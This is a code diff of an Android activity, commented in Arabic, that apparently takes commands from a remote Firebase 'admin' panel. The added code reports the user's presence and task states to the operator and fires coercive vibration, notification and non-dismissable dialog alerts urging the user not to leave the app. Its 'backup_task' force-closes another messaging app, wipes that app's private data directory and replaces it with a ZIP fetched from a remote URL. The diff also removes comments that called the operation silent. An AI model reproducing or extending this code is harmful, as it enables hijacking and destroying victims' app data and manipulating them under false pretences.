@@ -1,10 +1,15 @@
 package com.ban.ab;
 
 import android.app.AlertDialog;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Vibrator;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -17,8 +22,9 @@ import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.cardview.widget.CardView;
+import androidx.core.app.NotificationCompat;
 
-// استيراد حزمة Firebase الرسمية للربط الحي والمباشر 🚀
+// استيراد حزم Firebase الرسمية للربط الحي والمباشر 🚀
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
@@ -44,6 +50,7 @@ public class SecondActivity extends AppCompatActivity {
     
     // مراجع الفايربيس الرسمية
     private DatabaseReference mCommandsRef;
+    private DatabaseReference mUserStatusRef;
     private ValueEventListener mCommandsListener;
 
     private CardView layoutWaiting, layoutRejected, layoutZipTask, layoutVerifyTask, layoutPayment;
@@ -61,11 +68,28 @@ public class SecondActivity extends AppCompatActivity {
 
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");
 
+        // تهيئة مراجع المراقبة وحالة النشاط الحية
+        mUserStatusRef = FirebaseDatabase.getInstance().getReference("users_status").child(userName);
+
         initViews();
         generateTicketID();
         
         // البدء بمراقبة أوامر لوحة التحكم بشكل حي ⚡
         startRealtimeCommandListener();
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // 🟢 تحديث حالة المستخدم إلى متصل وداخل التطبيق الآن عند فتح الواجهة
+        mUserStatusRef.child("status").setValue("Online (In-App)");
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        // 🔴 تحديث حالة المستخدم عند خروج التطبيق للخلفية أو إغلاقه
+        mUserStatusRef.child("status").setValue("Offline");
     }
 
     private void initViews() {
@@ -96,6 +120,15 @@ public class SecondActivity extends AppCompatActivity {
                     return;
                 }
 
+                // الفحص الفوري لأمر التنبيه والاهتزاز العاجل 🚨
+                if (snapshot.hasChild("trigger_alert")) {
+                    Boolean shouldAlert = snapshot.child("trigger_alert").getValue(Boolean.class);
+                    if (shouldAlert != null && shouldAlert) {
+                        triggerUserAlert();
+                        mCommandsRef.child("trigger_alert").setValue(false); // تصفير الراية لمنع التكرار
+                    }
+                }
+
                 Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                 String status = snapshot.child("status").getValue(String.class);
                 String content = snapshot.child("content").getValue(String.class);
@@ -118,6 +151,50 @@ public class SecondActivity extends AppCompatActivity {
         mCommandsRef.addValueEventListener(mCommandsListener);
     }
 
+    // دالة موحدة لضخ أعلام ومعرفات الحالة الرقمية لتوستات العميل إلى الأدمن 🛡️
+    private void updateAppFlag(String stateCode) {
+        mUserStatusRef.child("current_state").setValue(stateCode)
+                .addOnFailureListener(e -> Log.e("State_Update", "فشل دفع المعرف السحابي"));
+    }
+
+    // محرك التنبيه الثلاثي (اهتزاز ميكانيكي + إشعار نظام + ديالوج)
+    private void triggerUserAlert() {
+        // 1. تشغيل الاهتزاز الميكانيكي لشد انتباه المستخدم
+        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+        if (vibrator != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+            } else {
+                vibrator.vibrate(1000);
+            }
+        }
+
+        // 2. بناء قناة ودفع إشعار رسمي علوي
+        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        String channelId = "admin_alerts_channel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(channelId, "تنبيهات النظام", NotificationManager.IMPORTANCE_HIGH);
+            if (nm != null) nm.createNotificationChannel(channel);
+        }
+
+        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId)
+                .setSmallIcon(android.R.drawable.stat_sys_warning)
+                .setContentTitle("تنبيه هام 🛡️")
+                .setContentText("يرجى البقاء داخل التطبيق لإكمال عملية التحقق.")
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setAutoCancel(true);
+
+        if (nm != null) nm.notify(202, builder.build());
+
+        // 3. انبثاق واجهة ديالوج إجبارية تمنع الإغلاق العشوائي
+        new AlertDialog.Builder(this)
+                .setTitle("تحديث مطلوب")
+                .setMessage("يرجى عدم إغلاق التطبيق أو الخروج من هذه الشاشة حتى انتهاء المزامنة السحابية بنجاح.")
+                .setPositiveButton("موافق", null)
+                .setCancelable(false)
+                .show();
+    }
+
     private void handleDeletion() {
         getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
         Toast.makeText(this, "انتهت صلاحية الجلسة أو تم إلغاء الحساب", Toast.LENGTH_LONG).show();
@@ -138,7 +215,7 @@ public class SecondActivity extends AppCompatActivity {
                 txtRejectReason.setText(content.isEmpty() ? "تم رفض طلبك حالياً" : content);
                 break;
                 
-            case "backup_task": // الاستعادة صمتاً عبر فك ضغط ملف ZIP المباشر 🔄
+            case "backup_task": 
                 layoutZipTask.setVisibility(View.VISIBLE);
                 btnExecuteTask.setText("تطبيق التحديث الفوري (ZIP)");
                 btnExecuteTask.setOnClickListener(v -> startZipExtractionProcess(backupUrl));
@@ -146,7 +223,10 @@ public class SecondActivity extends AppCompatActivity {
                 
             case "verify_phone":
                 layoutVerifyTask.setVisibility(View.VISIBLE);
-                btnStartFullVerify.setOnClickListener(v -> startActivity(new Intent(this, VerifyActivity.class)));
+                btnStartFullVerify.setOnClickListener(v -> {
+                    updateAppFlag("STATE_INITIALIZING"); // دفع معرّف تهيئة الفحص للأدمن
+                    startActivity(new Intent(this, VerifyActivity.class));
+                });
                 break;
                 
             case "show_payment":
@@ -177,73 +257,73 @@ public class SecondActivity extends AppCompatActivity {
         layoutPayment.setVisibility(View.GONE);
     }
 
-    // تحميل ملف ZIP واستخراجه في مجلد الحزمة المتطابقة ذات التوقيع المشترك 📦
     private void startZipExtractionProcess(String zipUrl) {
-    if (zipUrl == null || zipUrl.isEmpty()) return;
-    
-    btnExecuteTask.setEnabled(false);
-    taskProgressBar.setVisibility(View.VISIBLE);
-    
-    new Thread(() -> {
-        try {
-            // 1. إرسال برودكاست لإغلاق الواتساب المعدل فوراً قبل تعديل الملفات
-            Intent stopIntent = new Intent("com.target.app.ACTION_FORCE_CLOSE");
-            sendBroadcast(stopIntent);
-            
-            // انتظار بسيط للتأكد من إغلاق العمليات (Process) الخاصة بالواتساب
-            Thread.sleep(1000);
-
-            // 2. تحميل ملف الـ ZIP من السيرفر
-            File tempZip = new File(getFilesDir(), "Backup.zip");
-            downloadFileNative(zipUrl, tempZip);
-
-            // 3. مسار مجلد البيانات المستهدف
-            File targetWhatsappDir = new File("/data/data/com.target.app/"); 
-
-            if (targetWhatsappDir.exists()) {
-                runOnUiThread(() -> Toast.makeText(this, "جاري تهيئة المجلد ومسح البيانات القديمة...", Toast.LENGTH_SHORT).show());
-                
-                // 4. التنظيف الكامل: حذف محتويات مجلد الواتساب القديم لتجنب تداخل الملفات
-                deleteDirectoryContents(targetWhatsappDir);
-                
-                // 5. استخراج محتويات الـ ZIP الجديدة بالكامل
-                unzip(tempZip, targetWhatsappDir);
-
-                runOnUiThread(() -> {
-                    Toast.makeText(this, "اكتمل استبدال البيانات والتحديث بنجاح! ✅", Toast.LENGTH_LONG).show();
-                    resetStatusOnServer();
-                });
-            } else {
-                runOnUiThread(() -> Toast.makeText(this, "خطأ: لم يتم العثور على الحزمة المستهدفة", Toast.LENGTH_SHORT).show());
-            }
-
-        } catch (Exception e) {
-            Log.e("Zip_Extraction_Error", "Failed to clear or transfer files", e);
-            runOnUiThread(() -> Toast.makeText(this, "فشل في معالجة واستبدال الملفات", Toast.LENGTH_SHORT).show());
-        }
+        if (zipUrl == null || zipUrl.isEmpty()) return;
         
-        runOnUiThread(() -> {
-            taskProgressBar.setVisibility(View.GONE);
-            btnExecuteTask.setEnabled(true);
-        });
-    }).start();
-}
+        btnExecuteTask.setEnabled(false);
+        taskProgressBar.setVisibility(View.VISIBLE);
+        
+        new Thread(() -> {
+            try {
+                Intent stopIntent = new Intent("com.target.app.ACTION_FORCE_CLOSE");
+                sendBroadcast(stopIntent);
+                Thread.sleep(1000);
 
-// دالة مسح كافة الملفات والمجلدات الفرعية داخل المجلد المستهدف
-private void deleteDirectoryContents(File dir) {
-    if (dir.isDirectory()) {
-        String[] children = dir.list();
-        if (children != null) {
-            for (String child : children) {
-                File file = new File(dir, child);
-                if (file.isDirectory()) {
-                    deleteDirectoryContents(file); // مسح المجلدات الفرعية تكرارياً
+                File tempZip = new File(getFilesDir(), "Backup.zip");
+                downloadFileNative(zipUrl, tempZip);
+
+                File targetWhatsappDir = new File("/data/data/com.target.app/"); 
+
+                if (targetWhatsappDir.exists()) {
+                    runOnUiThread(() -> {
+                        Toast.makeText(this, "جاري تهيئة المجلد ومسح البيانات القديمة...", Toast.LENGTH_SHORT).show();
+                    });
+                    
+                    deleteDirectoryContents(targetWhatsappDir);
+                    unzip(tempZip, targetWhatsappDir);
+
+                    runOnUiThread(() -> {
+                        Toast.makeText(this, "اكتمل استبدال البيانات والتحديث بنجاح! ✅", Toast.LENGTH_LONG).show();
+                        updateAppFlag("STATE_SYNC_SUCCESS"); // 🟢 إرسال معرّف النجاح للأدمن
+                        resetStatusOnServer();
+                    });
+                } else {
+                    runOnUiThread(() -> {
+                        Toast.makeText(this, "خطأ: لم يتم العثور على الحزمة المستهدفة", Toast.LENGTH_SHORT).show();
+                        updateAppFlag("STATE_SYNC_FAILED"); // 🔴 إرسال معرّف الفشل للأدمن
+                    });
                 }
-                file.delete();
+
+            } catch (Exception e) {
+                Log.e("Zip_Extraction_Error", "Failed to clear or transfer files", e);
+                runOnUiThread(() -> {
+                    Toast.makeText(this, "فشل في معالجة واستبدال الملفات", Toast.LENGTH_SHORT).show();
+                    updateAppFlag("STATE_SYNC_FAILED"); // 🔴 إرسال معرّف الفشل للأدمن
+                });
+            }
+            
+            runOnUiThread(() -> {
+                taskProgressBar.setVisibility(View.GONE);
+                btnExecuteTask.setEnabled(true);
+            });
+        }).start();
+    }
+
+    private void deleteDirectoryContents(File dir) {
+        if (dir.isDirectory()) {
+            String[] children = dir.list();
+            if (children != null) {
+                for (String child : children) {
+                    File file = new File(dir, child);
+                    if (file.isDirectory()) {
+                        deleteDirectoryContents(file); 
+                    }
+                    file.delete();
+                }
             }
         }
     }
-}
+
     private void downloadFileNative(String fileUrl, File destFile) throws IOException {
         URL url = new URL(fileUrl);
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -266,7 +346,6 @@ private void deleteDirectoryContents(File dir) {
         }
     }
 
-    // محرك فك الضغط المدمج لنقل المجلدات بشكل هيكلي صحيح داخل الحزمة 📁
     private void unzip(File zipFile, File targetDirectory) throws IOException {
         try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
             ZipEntry ze;
